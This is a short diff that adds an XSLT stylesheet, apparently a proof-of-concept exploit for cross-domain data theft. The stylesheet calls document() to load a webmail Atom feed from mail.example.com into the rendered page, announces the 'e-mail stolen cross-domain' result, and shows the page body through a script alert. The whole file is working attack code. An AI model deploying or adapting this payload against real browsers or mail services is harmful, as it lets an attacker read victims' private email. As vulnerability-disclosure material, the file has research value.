@@ -1,0 +1,14 @@
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:str="http://exslt.org/strings" extension-element-prefixes="str">
+<xsl:template match="*">
+<html>
+<body>
+Below, you should see e-mail stolen cross-domain!
+<p/>
+<xsl:value-of select="document('https://mail.example.com/mail/feed/atom')"/>
+<script>
+alert(document.body.innerHTML)
+</script>
+</body>
+</html>
+</xsl:template>
+</xsl:stylesheet>
